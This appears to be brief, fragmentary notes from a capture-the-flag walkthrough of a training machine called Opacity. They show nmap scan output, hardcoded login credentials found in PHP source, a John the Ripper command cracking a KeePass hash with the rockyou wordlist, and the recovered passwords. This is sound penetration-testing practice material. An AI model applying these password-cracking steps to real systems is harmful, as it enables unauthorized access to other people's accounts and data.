## Desc

Opacity is an easy machine that can help you in the penetration testing learning process.
There are 2 hash keys located on the machine (user - local.txt and root - proof.txt). Can you find them and become root?
Hint: There are several ways to perform an action; always analyze the behavior of the application.

## Recon


```sh
Not shown: 64588 closed tcp ports (reset), 943 filtered tcp ports (no-response)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


```


```php
if(isset($_POST['Submit'])){
                /* Define username and associated password array */
                $logins = array('admin' => 'oncloud9','root' => 'oncloud9','administrator' => 'oncloud9');


```

```sh

# john --format=KeePass opacity.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 100000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:03 0.00% (ETA: 2024-04-21 19:14) 0g/s 31.63p/s 31.63c/s 31.63C/s iloveme..diamond
741852963        (dataset)     
1g 0:00:00:27 DONE (2024-04-16 23:20) 0.03608g/s 31.75p/s 31.75c/s 31.75C/s chichi..david1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 


Cl0udP4ss40p4city#8700
```